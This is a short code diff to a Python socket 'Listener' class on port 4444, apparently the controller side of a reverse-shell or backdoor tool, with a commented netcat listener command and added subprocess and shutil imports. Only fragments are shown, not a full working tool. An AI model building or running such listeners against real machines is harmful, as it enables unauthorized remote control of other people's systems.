@@ -1,6 +1,10 @@
+import os
+import shutil
 import socket
 import json
 import base64
+import subprocess
+import sys
 
 
 # nc -vv -l -p 4444
@@ -60,5 +64,8 @@ class Listener:
             print(result)
 
 
-my_listener = Listener("192.168.189.128", 4444)
-my_listener.start()
+try:
+    my_listener = Listener("192.168.189.130", 4444)
+    my_listener.start()
+except Exception:
+    sys.exit()
